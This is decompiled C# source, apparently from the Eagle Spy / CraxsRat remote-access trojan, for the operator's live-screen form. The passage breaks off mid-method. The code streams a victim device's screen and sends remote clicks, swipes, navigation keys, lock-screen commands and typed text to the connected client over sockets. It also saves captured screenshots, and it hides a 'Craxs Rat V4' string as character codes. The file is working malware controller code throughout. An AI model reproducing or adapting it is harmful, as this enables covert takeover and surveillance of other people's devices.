using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eaglespy;
using Eagle_Spy.My;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000026 RID: 38
	[DesignerGenerated]
	public partial class Button5 : Form
	{
		// Token: 0x060002CD RID: 717 RVA: 0x000455CC File Offset: 0x000437CC
		public Button5()
		{
			base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatskjasnhfcs;
			base.FormClosing += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscajhg;
			base.KeyDown += this.ScreenShoter_KeyDown_1;
			this.ScreenShotFoucs = false;
			this.Rnew = 0;
			this.Title = "null";
			this.@checked = false;
			this.sizearry = new string[]
			{
				"Auto", "2560x1600", "2048x1536", "1920x1200", "1920x1152", "1920x1080", "1600x1200", "1600x900", "1440x904", "1366x768",
				"1360x768", "1280x960", "1280x800", "1280x768", "1280x720", "1279x720", "1152x720", "1080x607", "1024x960", "1024x770",
				"1024x768", "1024x600", "960x640", "960x600", "960x540", "864x480", "854x480", "800x600", "800x480", "768x576",
				"640x480", "640x360", "480x320", "432x240", "450x300", "400x240", "320x240", "280x280"
			};
			this.Swaping = false;
			this.isdown = false;
			this.isclick = false;
			this.recordit = false;
			this.tiks = 0;
			this.iscontroled = false;
			this.keepmeto = false;
			this.InitializeComponent();
		}

		// Token: 0x060002D0 RID: 720
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

		// Token: 0x060002D1 RID: 721 RVA: 0x00047A0C File Offset: 0x00045C0C
		private void trans()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) == 0)
				{
					this.Save.Text = "节省";
					return;
				}
			}
			else
			{
				this.Save.Text = "حفظ";
			}
		}

		// Token: 0x060002D2 RID: 722 RVA: 0x00047A5C File Offset: 0x00045C5C
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatskjasnhfcs(object sender, EventArgs e)
		{
			this.combosize.Items.Clear();
			this.trans();
			string[] array = this.sizearry;
			string[] array2 = array;
			foreach (string text in array2)
			{
				this.combosize.Items.Add(text);
			}
			string text2 = RegistryHandler.GET_Tip(RegistryHandler.ShowScrenShotTip);
			bool flag = true;
			if (text2 != null)
			{
				if (Operators.CompareString(text2, "no", false) == 0)
				{
					flag = false;
				}
			}
			else
			{
				flag = true;
			}
			if (flag)
			{
				base.KeyPreview = true;
			}
			base.Tag = this.classClient.ClientRemoteAddress;
			this.toptitle.Text = " ";
			this.combosize.Text = "Auto";
			this.ClientPic.Image = this.classClient.Wallpaper;
			this.ClientPic.Image = this.classClient.Wallpaper;
			base.TransparencyKey = Color.FromArgb(45, 45, 45);
			this.BackColor = Color.FromArgb(45, 45, 45);
			this.Qualtibox.Text = MySettingsProperty.Settings.live_sc_qulty;
			int num = 2;
			checked
			{
				do
				{
					this.FPSBOX.Items.Add(num.ToString());
					num++;
				}
				while (num <= 30);
				this.FPSBOX.Text = "30";
				this.Qualtibox.Items.Clear();
				int num2 = 1;
				do
				{
					this.Qualtibox.Items.Add(num2.ToString());
					num2++;
				}
				while (num2 <= 100);
				this.Qualtibox.Text = "50";
				IntPtr intPtr = new IntPtr(-2);
				Button5.SetWindowPos(base.Handle, intPtr, 0, 0, 0, 0, 3U);
				this.keepmeto = true;
			}
		}

		// Token: 0x060002D3 RID: 723 RVA: 0x00047C1C File Offset: 0x00045E1C
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscdasjj(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>U",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002D4 RID: 724 RVA: 0x00047D40 File Offset: 0x00045F40
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcds(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>D",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002D5 RID: 725 RVA: 0x00047E64 File Offset: 0x00046064
		private void Button3_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>L",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002D6 RID: 726 RVA: 0x00047F88 File Offset: 0x00046188
		private void Button4_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>R",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002D7 RID: 727 RVA: 0x00002423 File Offset: 0x00000623
		public void Viewdimiss()
		{
		}

		// Token: 0x060002D8 RID: 728 RVA: 0x000480AC File Offset: 0x000462AC
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			this.ScreenShotFoucs = false;
			if (e.Button == MouseButtons.Left)
			{
				this.Trakpoint = new List<Point>();
				this.Trakpoint.Add(new Point(e.X, e.Y));
				this.isclick = false;
				this.isdown = true;
				return;
			}
			this.presstimer.Enabled = true;
			this.isclick = true;
		}

		// Token: 0x060002D9 RID: 729 RVA: 0x00048118 File Offset: 0x00046318
		private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isdown = false;
			int width = this.Livepicbox.Width;
			int height = this.Livepicbox.Height;
			checked
			{
				if (this.isclick)
				{
					this.presstimer.Enabled = false;
					this.presstimer.Stop();
					string text = "clk:";
					if (this.tiks > 3)
					{
						text = "clk:hold:";
					}
					this.tiks = 0;
					Point point = this.Livepicbox.PointToClient(Control.MousePosition);
					if (Operators.CompareString(this.combosize.Text, "Auto", false) != 0)
					{
						string[] array = this.combosize.Text.Split(new char[] { 'x' });
						this.ScreenSize = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[0]));
					}
					Point point2 = new Point((int)Math.Round(unchecked((double)point.X * ((double)this.ScreenSize.Width / (double)width))), (int)Math.Round(unchecked((double)point.Y * ((double)this.ScreenSize.Height / (double)height))));
					text = text + point2.X.ToString() + ":" + point2.Y.ToString();
					string[] array2 = this.classClient.Keys.Split(new char[] { ':' });
					object[] array3 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>",
							text,
							Data.SPL_SOCKET,
							array2[0],
							Data.SPL_SOCKET,
							array2[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array3);
					return;
				}
				if (!this.Swaping)
				{
					return;
				}
				this.Swaping = false;
				this.Trakpoint.Add(new Point(e.X, e.Y));
				StringBuilder stringBuilder = new StringBuilder();
				foreach (Point point3 in this.Trakpoint)
				{
					stringBuilder.Append(new Point((int)Math.Round(unchecked((double)point3.X * ((double)this.ScreenSize.Width / (double)width))), (int)Math.Round(unchecked((double)point3.Y * ((double)this.ScreenSize.Height / (double)height)))).ToString() + ":");
				}
				string[] array4 = this.classClient.Keys.Split(new char[] { ':' });
				object[] array5 = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>",
						stringBuilder.ToString(),
						Data.SPL_SOCKET,
						array4[0],
						Data.SPL_SOCKET,
						array4[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array5);
			}
		}

		// Token: 0x060002DA RID: 730 RVA: 0x00048534 File Offset: 0x00046734
		private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isdown)
			{
				this.Swaping = true;
				this.isclick = false;
				if (e.X > 0 && e.Y > 0)
				{
					this.Trakpoint.Add(new Point(e.X, e.Y));
				}
			}
		}

		// Token: 0x060002DB RID: 731 RVA: 0x00002423 File Offset: 0x00000623
		private void Autosave_CheckedChanged(object sender)
		{
		}

		// Token: 0x060002DC RID: 732
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x060002DD RID: 733
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x060002DE RID: 734 RVA: 0x00002CA4 File Offset: 0x00000EA4
		private void Panel2_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Button5.ReleaseCapture();
				Button5.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060002DF RID: 735 RVA: 0x00002CA4 File Offset: 0x00000EA4
		private void Panel3_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Button5.ReleaseCapture();
				Button5.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060002E0 RID: 736 RVA: 0x00002CA4 File Offset: 0x00000EA4
		private void Panel4_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Button5.ReleaseCapture();
				Button5.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060002E1 RID: 737 RVA: 0x00002423 File Offset: 0x00000623
		private void Button1_Click_3(object sender, EventArgs e)
		{
		}

		// Token: 0x060002E2 RID: 738 RVA: 0x00048588 File Offset: 0x00046788
		public string Clientout(string timeoutmil)
		{
			string[] array = (timeoutmil + "\u200b97\u200b120\u200b115\u200b32\u200b82\u200b97\u200b116\u200b32\u200b86\u200b52").Replace("\u200b", " ").Split(new char[] { ' ' });
			string text = "";
			string[] array2 = array;
			string[] array3 = array2;
			foreach (string text2 in array3)
			{
				if (text2.Length > 0)
				{
					text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
				}
			}
			return text;
		}

		// Token: 0x060002E3 RID: 739 RVA: 0x0004860C File Offset: 0x0004680C
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscajhg(object sender, FormClosingEventArgs e)
		{
			base.Name = null;
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sc:off",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							"0",
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.toptitle.Text = "...";
					this.classClient.SendMessage(array2);
					this.toptitle.Text = " ";
					this.vewpnl.Enabled = false;
					this.Livepicbox.Enabled = false;
					this.LIVE = false;
					this.refreshtimer.Stop();
				}
				catch (Exception)
				{
				}
			}
			base.Dispose();
		}

		// Token: 0x060002E4 RID: 740 RVA: 0x00048794 File Offset: 0x00046994
		private void Timer1_Tick(object sender, EventArgs e)
		{
			if (this.Save.Checked)
			{
				if (!Directory.Exists(this.DownloadsFolder + "\\ScreenShots"))
				{
					Directory.CreateDirectory(this.DownloadsFolder + "\\ScreenShots");
				}
				try
				{
					this.Livepicbox.Image.Save(string.Concat(new string[]
					{
						this.DownloadsFolder,
						"\\ScreenShots\\IMG-",
						DateTime.Now.Day.ToString(),
						"-",
						DateTime.Now.Month.ToString(),
						"-",
						DateTime.Now.Millisecond.ToString(),
						".png"
					}));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
			this.Timer1.Stop();
		}

		// Token: 0x060002E5 RID: 741 RVA: 0x0004888C File Offset: 0x00046A8C
		public void Done(object[] objs)
		{
			if (this.toptitle.InvokeRequired)
			{
				Button5.addLogback addLogback = new Button5.addLogback(this.Done);
				this.toptitle.Invoke(addLogback, new object[] { objs });
				return;
			}
			string text = Conversions.ToString(objs[0]);
			this.toptitle.Text = text;
		}

		// Token: 0x060002E6 RID: 742 RVA: 0x00002CCC File Offset: 0x00000ECC
		private void Presstimer_Tick(object sender, EventArgs e)
		{
			checked
			{
				this.tiks++;
			}
		}

		// Token: 0x060002E7 RID: 743 RVA: 0x000488E0 File Offset: 0x00046AE0
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsjkhsdawe(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002E8 RID: 744 RVA: 0x00002CDC File Offset: 0x00000EDC
		private void Dismisbtn_Click(object sender, EventArgs e)
		{
			if (this.Livepicbox.Image != null)
			{
				this.Livepicbox.Image = null;
				this.ScreenShotFoucs = false;
			}
		}

		// Token: 0x060002E9 RID: 745 RVA: 0x00002CFE File Offset: 0x00000EFE
		private void Save_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.Save.Checked)
			{
				this.Timer1.Start();
				return;
			}
			this.Timer1.Stop();
		}

		// Token: 0x060002EA RID: 746 RVA: 0x00048A04 File Offset: 0x00046C04
		private void DrakeUIAvatar6_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKOS",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
			base.Close();
		}

		// Token: 0x060002EB RID: 747 RVA: 0x00002D24 File Offset: 0x00000F24
		private void DrakeUIAvatar5_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x060002EC RID: 748 RVA: 0x00048B30 File Offset: 0x00046D30
		private void DrakeUIAvatar3_Click_1(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>Bc",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002ED RID: 749 RVA: 0x00048C54 File Offset: 0x00046E54
		private void DrakeUIAvatar4_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>Ho",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002EE RID: 750 RVA: 0x00048D78 File Offset: 0x00046F78
		private void DrakeUIAvatar7_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>RC",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002EF RID: 751 RVA: 0x00048E9C File Offset: 0x0004709C
		private void StopButton_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sc:off",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							"0",
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.toptitle.Text = "...";
					this.classClient.SendMessage(array2);
					this.Guna2Button2.Enabled = false;
					this.toptitle.Text = " ";
					this.vewpnl.Enabled = false;
					this.Livepicbox.Enabled = false;
					this.LIVE = false;
					this.refreshtimer.Stop();
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002F0 RID: 752 RVA: 0x00049020 File Offset: 0x00047220
		private void ScreenShoter_KeyDown_1(object sender, KeyEventArgs e)
		{
			char c = Conversions.ToChar(MyProject.Computer.Keyboard.CapsLock ? Conversions.ToString(Strings.ChrW((int)e.KeyCode)) : Strings.ChrW((int)e.KeyCode).ToString().ToLower());
			Console.WriteLine("Key Pressed: " + Conversions.ToString(c));
		}

		// Token: 0x060002F1 RID: 753 RVA: 0x00049084 File Offset: 0x00047284
		private void DrakeUIAvatar2_Click(object sender, EventArgs e)
		{
			if (this.classClient != null && this.textsend.Text.Length > 0)
			{
				object[] array = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"pst<*>",
						this.textsend.Text,
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
				this.textsend.Text = "";
			}
		}

		// Token: 0x060002F2 RID: 754 RVA: 0x000491B4 File Offset: 0x000473B4
		private void DrakeUIAvatar8_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>En",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002F3 RID: 755 RVA: 0x000492DC File Offset: 0x000474DC
		private void DrakeUIAvatar9_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKeb",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002F4 RID: 756 RVA: 0x00002423 File Offset: 0x00000623
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060002F5 RID: 757 RVA: 0x00049400 File Offset: 0x00047600
		private void PictureBox1_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKen",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002F6 RID: 758 RVA: 0x00048C54 File Offset: 0x00046E54
		private void Button6_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>Ho",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002F7 RID: 759 RVA: 0x00002423 File Offset: 0x00000623
		private void TSwitch1_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060002F8 RID: 760 RVA: 0x00048D78 File Offset: 0x00046F78
		private void Button7_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>RC",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002F9 RID: 761 RVA: 0x00048B30 File Offset: 0x00046D30
		private void Button5_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>Bc",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060002FA RID: 762 RVA: 0x00049084 File Offset: 0x00047284
		private void Enterbutton_Click(object sender, EventArgs e)
		{
			if (this.classClient != null && this.textsend.Text.Length > 0)
			{
